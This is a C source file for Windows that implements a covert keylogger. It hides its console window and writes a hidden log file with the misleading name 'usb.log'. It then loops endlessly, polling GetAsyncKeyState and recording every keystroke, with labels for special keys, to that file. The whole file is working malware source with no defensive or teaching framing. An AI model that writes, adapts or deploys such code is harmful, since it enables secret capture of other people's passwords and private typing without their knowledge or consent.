#include <stdio.h>
#include <Windows.h>
#include <time.h>

#define LOG "usb.log"

void log(char);

int main() {
    // capture
    char cap;
    // time stuff
    time_t t;
    t = time(NULL);
    // Hide the window
    ShowWindow(GetConsoleWindow(), 0);
    // Title of the log file
    FILE *fp = fopen(LOG, "a+");
    fprintf(fp, "[USB LOG]\nSTART_TIME: %s\n\n", ctime(&t));
    fclose(fp);

    // hide the log file
    system("attrib +H "LOG);

    while(1) {
        // https://gist.github.com/patilswapnilv/7338783
        Sleep(20); // To make sure this program doesn't steal all resources.
        for(int i = 8; i <= 190; i++)
            if(GetAsyncKeyState(i) == -32767)
                log(i);
    }
}

void log(char key) {
    if (key == 1 || key == 2) return;

    FILE *fp = fopen(LOG, "a+");
    switch ((int)key)
    {
    case 0x08:
        fprintf(fp, "%s", "[BACKSPACE]");
        break;
    case 0x0d:
        fprintf(fp, "%s", "\n");
        break;
    case 0x20:
        fprintf(fp, "%s", " ");
        break;
    case VK_TAB:
        fprintf(fp, "%s", "[TAB]");
        break;
    case VK_SHIFT:
        fprintf(fp, "%s", "[SHIFT]");
        break;
    case VK_CONTROL:
        fprintf(fp, "%s", "[CONTROL]");
        break;
    case VK_ESCAPE:
        fprintf(fp, "%s", "[ESCAPE]");
        break;
    case VK_END:
        fprintf(fp, "%s", "[END]");
        break;
    case VK_HOME:
        fprintf(fp, "%s", "[HOME]");
        break;
    case VK_LEFT:
        fprintf(fp, "%s", "[LEFT]");
        break;
    case VK_UP:
        fprintf(fp, "%s", "[UP]");
        break;
    case VK_DOWN:
        fprintf(fp, "%s", "[DOWN]");
        break;
    case VK_RIGHT:
        fprintf(fp, "%s", "[RIGHT]");
        break;
    case 190:
    case 110:
        fprintf(fp, "%s", ".");
        break;
    default:
        fputc(key, fp);
        break;
    }
    fclose(fp);
}